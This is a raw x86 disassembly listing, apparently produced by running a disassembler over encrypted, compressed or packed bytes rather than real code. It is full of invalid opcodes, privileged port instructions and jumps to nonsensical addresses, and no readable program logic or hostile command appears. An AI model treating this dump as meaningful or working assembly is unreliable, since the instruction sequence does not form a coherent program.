  40a718:	aad    0xc6
  40a71a:	leave  
  40a71b:	pop    ebx
  40a71c:	in     eax,dx
  40a71d:	jae    0x40a6ba
  40a71f:	daa    
  40a720:	aas    
  40a721:	push   esi
  40a722:	mov    ah,0x83
  40a724:	xchg   esp,eax
  40a725:	add    eax,0xc0bf433b
  40a72a:	mov    dl,0x8c
  40a72c:	xlat   BYTE PTR ds:[ebx]
  40a72d:	xchg   ecx,eax
  40a72e:	push   0xffffffa0
  40a730:	mov    BYTE PTR [ecx+0x40],dh
  40a733:	cs int 0xbe
  40a736:	add    DWORD PTR [ecx+0x72],esi
  40a739:	xor    DWORD PTR [esi-0x42],ebx
  40a73c:	pop    ss
  40a73d:	dec    ebx
  40a73e:	mov    al,BYTE PTR [edx+edx*1-0x56576c05]
  40a745:	adc    eax,0x8c4ca1c9
  40a74a:	test   DWORD PTR [edi],ebx
  40a74c:	stos   BYTE PTR es:[edi],al
  40a74d:	cmp    BYTE PTR [eax-0x54b1cdc0],0x40
  40a754:	xor    ebp,esi
  40a756:	sub    esp,eax
  40a758:	sub    bh,dh
  40a75a:	pop    DWORD PTR [ebx-0x16]
  40a75d:	and    eax,0x6c1616d2
  40a762:	inc    edx
  40a763:	dec    edx
  40a764:	or     BYTE PTR [eax+eiz*4-0x74fc786f],al
  40a76b:	push   eax
  40a76c:	rcr    BYTE PTR [ecx],1
  40a76e:	aas    
  40a76f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a770:	xchg   esp,eax
  40a771:	or     DWORD PTR [esi],ebp
  40a773:	xor    al,0x12
  40a775:	sub    edi,DWORD PTR [edx-0x5f5962f6]
  40a77b:	cmp    eax,0x2edb0fec
  40a780:	ror    cl,1
  40a782:	fsub   st(5),st
  40a784:	pusha  
  40a785:	lock data16 loope 0x40a755
  40a789:	and    al,BYTE PTR [edi+esi*1-0x64]
  40a78d:	addr16 test ecx,ebx
  40a790:	iret   
  40a791:	push   ss
  40a792:	out    dx,eax
  40a793:	repz shl edi,0xaf
  40a797:	cmc    
  40a798:	sbb    ch,BYTE PTR cs:[ebx+0x3e96b89f]
  40a79f:	add    edx,esi
  40a7a1:	call   0x822af7c0
  40a7a6:	into   
  40a7a7:	lock push edx
  40a7a9:	lds    edi,FWORD PTR [ecx-0x614dc86b]
  40a7af:	outs   dx,DWORD PTR ds:[esi]
  40a7b0:	xlat   BYTE PTR ds:[ebx]
  40a7b1:	test   al,0x5b
  40a7b3:	mov    ah,0x4c
  40a7b5:	repz out 0xad,eax
  40a7b8:	dec    esp
  40a7b9:	cmp    BYTE PTR [esi],ch
  40a7bb:	lea    esi,[eax]
  40a7bd:	imul   edi,DWORD PTR [ecx+0x3b],0xffffff88
  40a7c1:	rol    ah,cl
  40a7c3:	sbb    al,0x9
  40a7c5:	leave  
  40a7c6:	dec    esi
  40a7c7:	push   ebx
  40a7c8:	or     al,0x23
  40a7ca:	xor    eax,0x4fe9d73f
  40a7cf:	pop    esi
  40a7d0:	test   eax,0x2692fe55
  40a7d5:	inc    esp
  40a7d6:	cmp    DWORD PTR [ecx-0x1d],edx
  40a7d9:	push   cs
  40a7da:	sub    eax,0xb8135ecd
  40a7df:	(bad)  
  40a7e0:	pop    ss
  40a7e1:	pusha  
  40a7e2:	dec    edx
  40a7e3:	popa   
  40a7e4:	xor    ebp,DWORD PTR [ecx-0x34ad4e4d]
  40a7ea:	nop
  40a7eb:	dec    edx
  40a7ec:	sti    
  40a7ed:	mov    ch,al
  40a7ef:	jae    0x40a822
  40a7f1:	pop    ecx
  40a7f2:	jecxz  0x40a783
  40a7f4:	in     al,0x73
  40a7f6:	xor    esi,eax
  40a7f8:	mov    esi,0x42b1a6f6
  40a7fd:	cwde   
  40a7fe:	adc    ch,BYTE PTR [eax+eax*4+0x4d]
  40a802:	mov    cl,0x16
  40a804:	sub    edi,DWORD PTR [esi]
  40a806:	push   ss
  40a807:	leave  
  40a808:	add    edi,DWORD PTR ds:0xb5249cd7
  40a80e:	xor    eax,0x4b3bdc62
  40a813:	leave  
  40a814:	les    ecx,FWORD PTR [edi-0x64b58af6]
  40a81a:	jb     0x40a7f8
  40a81c:	shl    esp,cl
  40a81e:	rol    BYTE PTR [edi],0x9f
  40a821:	jmp    0x7a0222de
  40a826:	ins    BYTE PTR es:[edi],dx
  40a827:	push   ss
  40a828:	push   eax
  40a829:	cmp    eax,0xdd473b78
  40a82e:	inc    ebx
  40a82f:	mov    ds:0x25f5a120,eax
  40a834:	mov    eax,ds:0x8f9ed7c6
  40a839:	cmp    ebx,DWORD PTR [ebx-0x11]
  40a83c:	je     0x40a8b7
  40a83e:	icebp  
  40a83f:	clc    
  40a840:	lods   al,BYTE PTR ds:[esi]
  40a841:	rcr    esp,1
  40a843:	aas    
  40a844:	pop    ss
  40a845:	push   edx
  40a846:	pop    ecx
  40a847:	jp     0x40a831
  40a849:	aad    0xcb
  40a84b:	pop    ebx
  40a84c:	mov    al,ds:0xa26eaa64
  40a851:	adc    al,0xd5
  40a853:	sbb    DWORD PTR [esi],edx
  40a855:	outs   dx,DWORD PTR ds:[esi]
  40a856:	jle    0x40a838
  40a858:	loope  0x40a8bd
  40a85a:	inc    ebx
  40a85b:	cmp    eax,0xc87b6da2
  40a860:	and    BYTE PTR [eax-0x3c],dh
  40a863:	or     al,0xdf
  40a865:	sub    al,0x7d
  40a868:	int3   
  40a869:	inc    edi
  40a86a:	dec    ebp
  40a86b:	(bad)  
  40a86c:	aaa    
  40a86d:	mov    edi,0x361916c7
  40a872:	xor    BYTE PTR [eax+0x27],ch
  40a875:	lock mov fs,WORD PTR [ecx]
  40a878:	or     BYTE PTR [edi+0x30],al
  40a87b:	adc    al,0x75
  40a87d:	lods   eax,DWORD PTR ds:[esi]
  40a87e:	imul   edi,DWORD PTR [edx-0x23],0x18
  40a882:	inc    edi
  40a883:	mov    dh,0x1d
  40a885:	sub    al,0x51
  40a887:	test   eax,0xd55e7ae4
  40a88c:	fcomp  QWORD PTR [eax+0x7d]
  40a88f:	popf   
  40a890:	call   0xe7ec660c
  40a895:	fisub  WORD PTR [edi]
  40a897:	or     cl,ah
  40a899:	xchg   ecx,eax
  40a89a:	pop    eax
  40a89b:	inc    edx
  40a89c:	push   edi
  40a89d:	adc    al,0xb0
  40a89f:	dec    ecx
  40a8a0:	xor    esp,DWORD PTR [ebx]
  40a8a2:	popa   
  40a8a3:	scas   al,BYTE PTR es:[edi]
  40a8a4:	push   edx
  40a8a5:	push   ebp
  40a8a6:	cld    
  40a8a7:	pop    es
  40a8a8:	into   
  40a8a9:	aam    0xa3
  40a8ab:	shl    BYTE PTR [esi+0x78],0xf3
  40a8af:	jecxz  0x40a88a
  40a8b1:	or     bl,BYTE PTR [ebp-0x51]
  40a8b4:	pop    ebp
  40a8b5:	lds    esi,FWORD PTR [esi+0x3]
  40a8b8:	or     eax,0x3b0f8b4f
  40a8bd:	lock mov ch,0x99
  40a8c0:	sbb    edx,DWORD PTR [edi+ebx*8+0x51]
  40a8c4:	xchg   edi,eax
  40a8c5:	sbb    eax,DWORD PTR [ecx+0x2d]
  40a8c8:	fdivrp st(2),st
  40a8ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8cb:	push   esp
  40a8cc:	inc    ebp
  40a8cd:	cmp    eax,0x56fd3fdc
  40a8d2:	mov    eax,0x416028ef
  40a8d7:	je     0x40a946
  40a8d9:	loope  0x40a86a
  40a8db:	jmp    0xeeda:0x9d89049c
  40a8e2:	dec    esp
  40a8e3:	out    dx,eax
  40a8e4:	clc    
  40a8e5:	and    al,0x3b
  40a8e7:	pop    ss
  40a8e8:	ins    BYTE PTR es:[edi],dx
  40a8e9:	icebp  
  40a8ea:	fs dec eax
  40a8ec:	(bad)  
  40a8ed:	mov    eax,ds:0xbaf2e9f9
  40a8f2:	inc    ecx
  40a8f3:	pop    eax
  40a8f4:	adc    eax,0xdd1dc47d
  40a8f9:	dec    ebx
  40a8fa:	ss es stos DWORD PTR es:[edi],eax
  40a8fd:	push   ds
  40a8fe:	sahf   
  40a8ff:	out    dx,eax
  40a900:	ins    DWORD PTR es:[edi],dx
  40a901:	xor    eax,0xc1f965f1
  40a906:	pusha  
  40a907:	outs   dx,DWORD PTR ds:[esi]
  40a908:	mov    DWORD PTR [esi+0xa88077],edx
  40a90e:	aas    
  40a90f:	pop    esp
  40a910:	or     al,0xd6
  40a912:	jle    0x40a946
  40a914:	cmp    eax,0x72dedb92
  40a919:	ds outs dx,DWORD PTR gs:[esi]
  40a91c:	cli    
  40a91d:	mov    eax,ds:0xd47f66f0
  40a922:	lds    ebx,FWORD PTR [ecx+0x32779204]
  40a928:	xchg   edx,eax
  40a929:	ja     0x40a8cc
  40a92b:	mov    ch,0x80
  40a92d:	inc    ebx
  40a92e:	mov    ds:0x104596eb,al
  40a933:	dec    eax
  40a934:	mov    dl,0x40
  40a936:	sub    al,0x10
  40a938:	sbb    al,0x9c
  40a93a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a93b:	push   ss
  40a93c:	xchg   edx,eax
  40a93d:	xchg   ecx,eax
  40a93e:	xchg   edx,eax
  40a93f:	mov    esp,0xa6d675f7
  40a944:	mov    ecx,0x8c665e2d
  40a949:	(bad)
  40a94c:	sbb    eax,0xb21f501d
  40a951:	mov    BYTE PTR [esi],ah
  40a953:	push   ss
  40a954:	fimul  DWORD PTR [ecx+ebx*2]
  40a957:	adc    bl,BYTE PTR [edi-0x7c29c50f]
  40a95d:	and    edx,DWORD PTR [ecx+0x5b]
  40a960:	sahf   
  40a961:	fisttp DWORD PTR [esi]
  40a963:	mov    ch,0xdd
  40a965:	gs add dl,dh
  40a968:	mov    ds:0xeedf8d60,eax
  40a96d:	pop    ecx
  40a96e:	mov    eax,0x20193ed7
  40a973:	and    DWORD PTR [ebp-0x2da72c28],0xfffffff7
  40a97a:	and    al,0x9
  40a97c:	jb     0x40a99c
  40a97e:	bound  edi,QWORD PTR [eax+0x2cd2b2a]
  40a984:	cmp    BYTE PTR [eax-0x3a3b2fc0],dl
  40a98a:	xchg   ebx,eax
  40a98b:	inc    esi
  40a98c:	push   ecx
  40a98d:	xchg   ecx,eax
  40a98e:	pop    esi
  40a98f:	push   0xffffffb2
  40a991:	(bad)  
  40a992:	call   0xecb7287a
  40a997:	sahf   
  40a998:	adc    eax,0x6ed4bf69
  40a99d:	and    DWORD PTR [ecx],esi
  40a99f:	and    al,0x6b
  40a9a1:	cmp    al,0x3a
  40a9a3:	data16 fist DWORD PTR [esi]
  40a9a6:	in     eax,dx
  40a9a7:	outs   dx,DWORD PTR ds:[esi]
  40a9a8:	test   al,0xc8
  40a9ab:	mov    ah,0x5e
  40a9ad:	les    esi,FWORD PTR [esi-0x271eb697]
  40a9b3:	mov    esp,0x37d8bf88
  40a9b8:	mov    dh,0xd
  40a9ba:	xor    al,0x18
  40a9bc:	call   0x4c8b:0xf4840728
  40a9c3:	inc    esi
  40a9c4:	cmp    BYTE PTR [ebx+0x8c86b96],bl
  40a9ca:	mov    cl,0x8
  40a9cc:	mov    bh,0x92
  40a9ce:	inc    esp
  40a9cf:	pop    esp
  40a9d0:	jmp    0xc98f4d39
  40a9d5:	cmp    DWORD PTR [esi-0x180896d3],ebx
  40a9db:	mov    WORD PTR [esp+esi*4],fs
  40a9de:	xchg   esp,eax
  40a9df:	fbld   TBYTE PTR [ebx+eiz*2-0x26f1dd70]
  40a9e6:	or     DWORD PTR [esi+0x23],ecx
  40a9e9:	std    
  40a9ea:	imul   eax,DWORD PTR [ebx+0x48f4252b],0xc89f8c93
  40a9f4:	outs   dx,DWORD PTR ds:[esi]
  40a9f5:	es sub eax,0x8fdda4b1
  40a9fb:	js     0x40a9bb
  40a9fd:	stc    
  40a9fe:	or     eax,0x44b99f24
  40aa03:	lds    ebx,FWORD PTR [edi-0x56]
  40aa06:	jge    0x40aa13
  40aa08:	nop
  40aa09:	mov    dl,0xbd
  40aa0b:	ret    0xb83d
  40aa0e:	adc    al,0x25
  40aa10:	cmp    BYTE PTR [esi+0x137b1b94],ah
  40aa16:	xchg   BYTE PTR [ecx+0x5b25cbcd],bh
  40aa1c:	or     bh,BYTE PTR [ebx+edi*4+0x28]
  40aa20:	cmp    al,0x80
  40aa22:	and    DWORD PTR [ecx],0xc42c3da5
  40aa28:	ror    BYTE PTR [ebx+edi*4],0xa1
  40aa2c:	mov    dl,0x34
  40aa2e:	and    DWORD PTR [ebx-0x4e7f6186],ebp
  40aa34:	jns    0x40a9b7
  40aa36:	xlat   BYTE PTR ds:[ebx]
  40aa37:	cmp    DWORD PTR [edi],edx
  40aa39:	fadd   st(0),st
  40aa3b:	ins    BYTE PTR es:[edi],dx
  40aa3c:	cmp    bl,0x92
  40aa3f:	adc    esp,DWORD PTR [esi+0x2ce8a076]
  40aa45:	and    dh,BYTE PTR [ebx+eiz*2]
  40aa48:	adc    dh,BYTE PTR [edx]
  40aa4a:	sbb    DWORD PTR [edx-0xab81ba1],eax
  40aa50:	pushf  
  40aa51:	enter  0x8eac,0xaf
  40aa55:	xchg   ebp,eax
  40aa56:	leave  
  40aa57:	xor    esi,DWORD PTR [esi-0x283bb1ed]
  40aa5d:	ins    DWORD PTR es:[edi],dx
  40aa5e:	fst    st(7)
  40aa60:	adc    eax,DWORD PTR [ebx]
  40aa62:	dec    ebx
  40aa63:	xchg   esp,eax
  40aa64:	xor    ebp,DWORD PTR [esp+edx*4+0x64]
  40aa68:	cli    
  40aa69:	jbe    0x40aa84
  40aa6b:	jmp    0xb0460d7e
  40aa70:	pop    ebp
  40aa71:	aaa    
  40aa72:	mov    bh,0x58
  40aa74:	test   BYTE PTR [ebx+esi*1-0x95447c9],dh
  40aa7b:	lahf   
  40aa7c:	sbb    ebx,DWORD PTR [ebx]
  40aa7e:	xchg   edi,eax
  40aa7f:	inc    esp
  40aa80:	popf   
  40aa81:	shl    DWORD PTR [esi],1
  40aa83:	sub    bh,bl
  40aa85:	adc    esi,DWORD PTR [edi+0x1c]
  40aa88:	shl    DWORD PTR [si],0x59
  40aa8c:	sub    al,0xfe
  40aa8e:	push   cs
  40aa8f:	adc    al,0x95
  40aa91:	mov    fs,WORD PTR [ebx]
  40aa93:	aad    0xcb
  40aa95:	stos   DWORD PTR es:[edi],eax
  40aa96:	out    0x82,eax
  40aa98:	imul   ebp,DWORD PTR [ebx+0x565ff7b4],0x1
  40aa9f:	xchg   ecx,eax
  40aaa0:	jnp    0x40ab0a
  40aaa2:	ror    DWORD PTR [ecx-0x45c67df],1
  40aaa8:	stos   DWORD PTR es:[edi],eax
  40aaa9:	mov    edx,0xbd727cb2
  40aaae:	ret    0x3aa5
  40aab1:	outs   dx,BYTE PTR ds:[esi]
  40aab2:	out    0x23,eax
  40aab4:	jmp    0x40aabb
  40aab6:	mov    ds:0x480fcf7f,al
  40aabb:	sub    al,0x7f
  40aabd:	pop    edx
  40aabe:	js     0x40aaf7
  40aac0:	inc    edi
  40aac1:	pop    edi
  40aac2:	push   cs
  40aac3:	pop    ecx
  40aac4:	sub    dl,0xb6
  40aac7:	jmp    0x40ab3a
  40aac9:	mov    dl,0x1
  40aacb:	clc    
  40aacc:	(bad)  [esi-0x5]
  40aacf:	adc    BYTE PTR [eax+0x75],bl
  40aad2:	stos   BYTE PTR es:[edi],al
  40aad3:	iret   
  40aad4:	ret    
  40aad5:	push   esi
  40aad6:	pop    ss
  40aad7:	mov    cl,0x6f
  40aad9:	push   ebx
  40aada:	out    0x3a,al
  40aadc:	and    bh,BYTE PTR [ebx*4+0x763c8375]
  40aae3:	jg     0x40aa89
  40aae5:	dec    edx
  40aae6:	arpl   WORD PTR [eax],si
  40aae8:	out    0xc2,al
  40aaea:	inc    edi
  40aaeb:	stos   BYTE PTR es:[edi],al
  40aaec:	vcvttpd2dq xmm4,YMMWORD PTR [esi-0x283e8f05]
  40aaf4:	pop    es
  40aaf5:	rcr    BYTE PTR [esi+ecx*2],cl
  40aaf8:	cmp    eax,DWORD PTR [ebx+0x157cb4ca]
  40aafe:	out    dx,eax
  40aaff:	pop    ebp
  40ab00:	pop    esi
  40ab01:	test   DWORD PTR [edi-0x68a77f22],ecx
  40ab07:	je     0x40ab88
  40ab09:	les    di,DWORD PTR [esi-0x713765c7]
  40ab10:	jg     0x40ab20
  40ab12:	inc    ebx
  40ab13:	sbb    BYTE PTR [edi-0x54],ch
  40ab16:	test   BYTE PTR [eax+0x6f],al
  40ab19:	xor    eax,DWORD PTR ds:0x5ed55862
  40ab1f:	aas    
  40ab20:	scas   al,BYTE PTR es:[edi]
  40ab21:	sbb    dh,bh
  40ab23:	push   0xab4e9edd
  40ab28:	inc    edi
  40ab29:	cmp    al,0xc5
  40ab2b:	(bad)  
  40ab2c:	add    bh,ch
  40ab2e:	leave  
  40ab2f:	das    
  40ab30:	push   ebp
  40ab31:	or     eax,0xfc4b91fb
  40ab36:	cmp    BYTE PTR [edi+edx*1-0x4e],al
  40ab3a:	push   edi
  40ab3b:	or     al,0x8a
  40ab3d:	in     eax,0x61
  40ab3f:	pop    ebx
  40ab40:	xchg   esp,eax
  40ab41:	into   
  40ab42:	dec    ebx
  40ab43:	outs   dx,BYTE PTR ds:[esi]
  40ab44:	cmc    
  40ab45:	shl    al,1
  40ab47:	mov    eax,0x300c8aaa
  40ab4c:	(bad)  
  40ab4d:	jmp    0xd4e7:0x8727f548
  40ab54:	xor    al,0x9b
  40ab56:	fnsave [ebx]
  40ab58:	mov    al,0x22
  40ab5a:	and    ebx,DWORD PTR [edx]
  40ab5c:	cmc    
  40ab5d:	jo     0x40ab01
  40ab5f:	add    BYTE PTR [ecx],dl
  40ab61:	and    edi,DWORD PTR [eax]
  40ab63:	push   esi
  40ab64:	inc    eax
  40ab65:	in     al,0x1c
  40ab67:	leave  
  40ab68:	out    dx,eax
  40ab69:	add    eax,0x98388733
  40ab6e:	add    ecx,DWORD PTR [edx]
  40ab70:	shl    esi,1
  40ab72:	icebp  
  40ab73:	adc    BYTE PTR [ebp+ebp*2-0xe234c5f],cl
  40ab7a:	cmc    
  40ab7b:	and    ch,dh
  40ab7d:	jp     0x40ab39
  40ab7f:	dec    esi
  40ab80:	bound  ebx,QWORD PTR [edi-0x5e5c14b2]
  40ab86:	in     eax,0x63
  40ab88:	xor    BYTE PTR [esi+edx*8-0x39f41658],0xad
  40ab90:	mov    edx,0x276040ae
  40ab95:	ret    
  40ab96:	push   eax
  40ab97:	jp     0x40ac12
  40ab99:	dec    ecx
  40ab9a:	and    DWORD PTR [ecx+0x8148232],0x2d20480d
  40aba4:	jg     0x40ac10
  40aba6:	ds shr eax,0x51
  40abaa:	add    eax,0x4041138b
  40abaf:	popa   
  40abb0:	mov    edx,0xefc23141
  40abb5:	(bad)  
  40abb7:	inc    edi
  40abb8:	fcom   DWORD PTR [ebx+0xa]
  40abbb:	je     0x40abaa
  40abbd:	dec    esp
  40abbe:	and    BYTE PTR [ecx*2+0x61e323fe],ah
  40abc5:	scas   al,BYTE PTR es:[edi]
  40abc6:	or     ebp,ebx
  40abc8:	mov    eax,ds:0x3d64aa0f
  40abcd:	and    al,0x3
  40abd0:	and    al,0xe9
  40abd2:	fwait
  40abd3:	push   0xdd3c1864
  40abd8:	repnz push 0x3b0c37b5
  40abde:	ins    DWORD PTR es:[edi],dx
  40abdf:	mov    esp,ebp
  40abe1:	outs   dx,DWORD PTR ds:[esi]
  40abe2:	or     eax,0xfe72f840
  40abe7:	int    0x34
  40abe9:	bound  esp,QWORD PTR [edx-0x2e]
  40abec:	mov    ebx,?
  40abee:	(bad)  
  40abef:	or     dl,BYTE PTR [eax]
  40abf1:	pop    ecx
  40abf2:	mov    ebp,0x27e987cd
  40abf7:	add    BYTE PTR [esi-0x68],0xf5
  40abfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abfc:	das    
  40abfd:	jb     0x40ac3d
  40abff:	popf   
  40ac00:	and    al,0x87
  40ac02:	sahf   
  40ac03:	imul   edi,DWORD PTR [ecx],0x78f566f8
  40ac09:	fbstp  TBYTE PTR [ecx]
  40ac0b:	sub    DWORD PTR [ecx+esi*8-0x51],esi
  40ac0f:	stc    
  40ac10:	(bad)  
  40ac11:	sbb    DWORD PTR [edx+ebx*8],edi
  40ac14:	sbb    al,0x82
  40ac16:	pusha  
  40ac17:	jo     0x40abc9
  40ac19:	lods   al,BYTE PTR ds:[esi]
  40ac1a:	rcr    DWORD PTR ds:0xdc7a49a,1
  40ac20:	cmp    ebx,DWORD PTR [esi-0xf]
  40ac23:	das    
  40ac24:	or     eax,0x59281ca4
  40ac29:	push   ss
  40ac2a:	xor    eax,ebx
  40ac2c:	fstp   TBYTE PTR [ebx-0x69bad6f1]
  40ac32:	jge    0x40ac37
  40ac34:	ss mov cl,0x52
  40ac37:	mov    cs,esi
  40ac39:	shr    DWORD PTR [edx-0x73],cl
  40ac3c:	mov    ds:0xddf1de4e,al
  40ac41:	adc    esi,DWORD PTR [edx-0x3e0db154]
  40ac47:	xchg   esp,eax
  40ac48:	pushf  
  40ac49:	mov    ds:0x20d85e14,al
  40ac4e:	mov    ds:0x64f8e9dc,al
  40ac53:	cmp    eax,0xad44646a
  40ac58:	popa   
  40ac59:	jo     0x40ac17
  40ac5b:	or     BYTE PTR [ebx],dh
  40ac5d:	lods   al,BYTE PTR ds:[esi]
  40ac5e:	dec    eax
  40ac5f:	mov    edx,ss
  40ac61:	in     al,dx
  40ac62:	xor    BYTE PTR [edi],bh
  40ac64:	stos   DWORD PTR es:[edi],eax
  40ac65:	jb     0x40ac5c
  40ac67:	and    BYTE PTR [eax],bl
  40ac69:	leave  
  40ac6a:	inc    ecx
  40ac6b:	test   al,0xbb
  40ac6d:	add    BYTE PTR [esi],al
  40ac6f:	lods   eax,DWORD PTR ds:[esi]
  40ac70:	sbb    edx,DWORD PTR cs:[edi-0x1e]
  40ac74:	and    bh,BYTE PTR [eax-0x5f]
  40ac77:	jmp    0x6fdb:0x4d890c83
  40ac7e:	nop
  40ac7f:	sub    BYTE PTR [edx+0x1f345165],ah
  40ac85:	dec    esi
  40ac86:	jmp    0x40acbe
  40ac88:	and    BYTE PTR [edx+eax*8-0x9],dh
  40ac8c:	xchg   ebp,eax
  40ac8d:	icebp  
  40ac8e:	jg     0x40ac33
  40ac90:	ins    DWORD PTR es:[edi],dx
  40ac91:	fnstenv [ecx]
  40ac93:	sbb    bl,0xc1
  40ac96:	call   0x504a79f8
  40ac9b:	gs retf 
  40ac9d:	loop   0x40ac49
  40ac9f:	jnp    0x40ac70
  40aca1:	test   DWORD PTR [ebx+0x58],edi
  40aca4:	push   ds
  40aca5:	int3   
  40aca6:	mov    bl,0x3
  40aca8:	mov    ebp,0xd830c44f
  40acad:	and    DWORD PTR [ebp-0x15],esp
  40acb0:	jmp    0x9faa29a7
  40acb5:	xchg   esi,eax
  40acb6:	fdivr  QWORD PTR [ebx-0x660e95d4]
  40acbc:	jns    0x40ac8e
  40acbe:	loop   0x40ac7c
  40acc0:	pop    ecx
  40acc1:	sbb    al,0x9d
  40acc3:	cmp    DWORD PTR [edi+0x12a1693a],ebp
  40acc9:	xor    al,0xb2
  40accb:	fsubp  st(7),st
  40accd:	rol    DWORD PTR [edx],0xac
  40acd0:	mov    ecx,0xbb709b01
  40acd5:	or     DWORD PTR [eax+0x24116042],ecx
  40acdb:	xor    bh,0xe9
  40acde:	adc    BYTE PTR [ecx-0x16a1f543],bh
  40ace4:	aam    0x1e
  40ace6:	add    DWORD PTR [ebx-0x2e67280],ebp
  40acec:	adc    al,0xfa
  40acee:	fs jbe 0x40aced
  40acf1:	popa   
  40acf2:	dec    edx
  40acf3:	out    dx,al
  40acf4:	inc    eax
  40acf5:	dec    ebp
  40acf6:	stc    
  40acf7:	or     dh,0xfd
  40acfa:	jns    0x40ad22
  40acfc:	mov    eax,ds:0x888d129a
  40ad01:	cdq    
  40ad02:	stc    
  40ad03:	jbe    0x40ad5e
  40ad05:	sub    BYTE PTR [ebx-0x42b55669],bh
  40ad0b:	cdq    
  40ad0c:	retf   
  40ad0d:	dec    eax
  40ad0e:	push   ds
  40ad0f:	xor    BYTE PTR [edx+0x1b2e0269],dh
  40ad15:	test   eax,0x65b4d406
  40ad1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad1b:	jge    0x40ace8
  40ad1d:	mov    ecx,DWORD PTR ds:0xbefddfc6
  40ad23:	inc    ebx
  40ad24:	aas    
  40ad25:	cmp    eax,0x7583aa9e
  40ad2a:	mov    DWORD PTR [edi-0x5a250862],eax
  40ad30:	popf   
  40ad31:	dec    edi
  40ad32:	popa   
  40ad33:	adc    eax,0x93ae24e2
  40ad38:	jb     0x40ad2d
  40ad3a:	adc    al,0x5b
  40ad3c:	or     DWORD PTR [ebx-0x48],ebp
  40ad3f:	je     0x40aced
  40ad41:	inc    esi
  40ad42:	imul   ecx,ecx,0xffffffe8
  40ad45:	and    bl,dh
  40ad47:	enter  0xf28d,0x92
  40ad4b:	int3   
  40ad4c:	add    DWORD PTR [ebx-0x66],edx
  40ad4f:	scas   eax,DWORD PTR es:[edi]
  40ad50:	icebp  
  40ad51:	sub    ah,BYTE PTR [ebp+0x13134adb]
  40ad57:	int    0x42
  40ad59:	pop    es
  40ad5a:	add    bh,cl
  40ad5c:	add    al,0x66
  40ad5e:	adc    BYTE PTR [edi+0x32],bh
  40ad61:	mov    ecx,0x4a1a9ae4
  40ad66:	pop    esi
  40ad67:	jle    0x40ad49
  40ad69:	rol    BYTE PTR [ecx-0x79bfd3d4],0xa6
  40ad70:	dec    edx
  40ad71:	jmp    0x40acf9
  40ad73:	or     DWORD PTR [edx+edx*2],0xa427cc8a
  40ad7a:	mov    ebp,0x87c8d401
  40ad7f:	fcmovbe st,st(2)
  40ad81:	lds    edi,FWORD PTR [eax-0x65]
  40ad84:	repz jmp 0xe562:0xcd5a150
  40ad8c:	dec    ebp
  40ad8d:	xor    eax,0xb27436ff
  40ad92:	daa    
  40ad93:	xor    al,0xc0
  40ad95:	and    dh,BYTE PTR [eax+edi*1]
  40ad98:	pop    esp
  40ad99:	jb     0x40ad51
  40ad9b:	aas    
  40ad9c:	cdq    
  40ad9d:	or     esp,ebp
  40ad9f:	pushf  
  40ada0:	add    DWORD PTR [ebp+0x40ed8fdb],edi
  40ada6:	ror    BYTE PTR [ecx+0x2f953545],1
  40adac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adad:	loop   0x40ad9f
  40adaf:	sub    al,0x81
  40adb2:	xor    eax,0xf33110d1
  40adb7:	stos   BYTE PTR es:[edi],al
  40adb8:	loope  0x40adcf
  40adba:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40adbc:	inc    edi
  40adbd:	cmc    
  40adbe:	jne    0x40ad44
  40adc0:	in     al,0x41
  40adc2:	out    dx,eax
  40adc3:	sub    DWORD PTR [eax],eax
  40adc5:	in     al,dx
  40adc6:	dec    ecx
  40adc7:	aaa    
  40adc8:	or     dh,BYTE PTR [edx+esi*8+0x2d]
  40adcc:	stos   DWORD PTR es:[edi],eax
  40adcd:	in     al,0x75
  40adcf:	jp     0x40adc2
  40add1:	push   es
  40add2:	xchg   DWORD PTR [ebx-0x5e],edi
  40add5:	cld    
  40add6:	push   ebp
  40add7:	dec    esp
  40add8:	adc    eax,0xd7560fd3
  40addd:	loopne 0x40ae2d
  40addf:	lds    ebx,FWORD PTR [edi-0x16]
  40ade2:	mov    esp,0x36a8a82d
  40ade7:	xor    BYTE PTR [edi-0x66cc6def],dh
  40aded:	mov    ebp,0xd7115355
  40adf2:	test   BYTE PTR [eax],al
  40adf4:	jo     0x40adc8
  40adf6:	ja     0x40ae66
  40adf8:	and    DWORD PTR [eax-0x34],0xffffff98
  40adfc:	icebp  
  40adfd:	cs sbb eax,esp
  40ae00:	in     eax,dx
  40ae01:	std    
  40ae02:	test   eax,0x8c4f1dab
  40ae07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae08:	cmp    eax,0x1f1a16d
  40ae0d:	call   DWORD PTR [ecx]
  40ae0f:	js     0x40ae54
  40ae11:	mov    BYTE PTR [ecx+edi*1],ah
  40ae14:	enter  0xf9cb,0xec
  40ae18:	ins    DWORD PTR es:[edi],dx
  40ae19:	xchg   ch,bh
  40ae1b:	jae    0x40ae21
  40ae1d:	(bad)  
  40ae1e:	dec    esi
  40ae1f:	pushf  
  40ae20:	outs   dx,DWORD PTR ds:[esi]
  40ae21:	int    0x78
  40ae23:	nop
  40ae24:	and    eax,0xf2eac5d4
  40ae29:	inc    esp
  40ae2a:	jmp    0x51a31b99
  40ae2f:	js     0x40ae2f
  40ae31:	neg    ch
  40ae33:	xor    al,BYTE PTR [edi+edx*4-0x499a6fc]
  40ae3a:	jbe    0x40ae9e
  40ae3c:	push   ebx
  40ae3d:	cmp    ebp,DWORD PTR ds:0x4c083dbd
  40ae43:	pusha  
  40ae44:	cmp    edx,ebx
  40ae46:	or     ch,BYTE PTR [ebp-0x7e4f7708]
  40ae4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae4d:	mov    eax,DWORD PTR [ecx-0x5011df93]
  40ae53:	cmp    edi,DWORD PTR [edx+0x52affad2]
  40ae59:	ficomp WORD PTR [eax-0xb]
  40ae5c:	jmp    0x77b8:0x45076160
  40ae63:	in     eax,0xfc
  40ae65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae66:	leave  
  40ae67:	add    al,0xe2
  40ae69:	and    BYTE PTR [ebx+0x4169332f],bl
  40ae6f:	add    edi,DWORD PTR [esi]
  40ae71:	mov    al,cs:0xf1db530b
  40ae77:	dec    edx
  40ae78:	mov    ds:0x42607694,al
